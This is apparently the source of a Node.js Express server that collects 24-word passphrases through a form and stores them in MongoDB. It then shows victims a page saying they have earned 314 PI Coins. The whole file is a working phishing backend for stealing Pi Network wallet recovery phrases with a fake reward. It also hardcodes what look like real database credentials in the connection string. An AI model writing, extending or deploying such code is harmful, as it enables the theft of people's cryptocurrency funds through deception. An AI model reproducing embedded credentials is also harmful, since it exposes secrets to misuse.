const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

// Create Express app
const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// MongoDB Connection
const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
mongoose
    .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.error('MongoDB connection error:', err));

// Define Mongoose Schema and Model
const PassphraseSchema = new mongoose.Schema({
    passphrase: { type: String, required: true }
});
const Passphrase = mongoose.model('Passphrase', PassphraseSchema);

// POST Route to handle form submission
app.post('/submit', async (req, res) => {
    const { passphrase } = req.body;

    if (!passphrase || passphrase.trim().split(" ").length !== 24) {
        return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
    }

    try {
        const newPassphrase = new Passphrase({ passphrase });
        await newPassphrase.save();

        // Send stylish HTML response with CSS and background image
        const successMessage = `
        <html>
            <head>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background-color: #f4f4f4;
                        color: #333;
                        text-align: center;
                        padding: 50px;
                    }
                    .message {
                        background: url('https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bluestacks.com%2Fapps%2Fsocial%2Fpi-network-on-pc.html&psig=AOvVaw1rUjN6j-wiq5K-d2dcqXM0&ust=1733930068221000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCIjL3YK_nYoDFQAAAAAdAAAAABAI') no-repeat center center;
                        background-size: cover;
                        color: white;
                        font-size: 24px;
                        font-weight: bold;
                        padding: 30px;
                        border-radius: 8px;
                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                        animation: fadeIn 1.5s ease-out;
                        max-width: 600px;
                        margin: auto;
                    }
                    @keyframes fadeIn {
                        0% {
                            opacity: 0;
                            transform: scale(0.95);
                        }
                        100% {
                            opacity: 1;
                            transform: scale(1);
                        }
                    }
                </style>
            </head>
            <body>
                <div class="message">
                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
                </div>
            </body>
        </html>`;

        res.status(200).send(successMessage);
    } catch (error) {
        console.error('Error saving passphrase:', error);
        res.status(500).send('Failed to save passphrase.');
    }
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
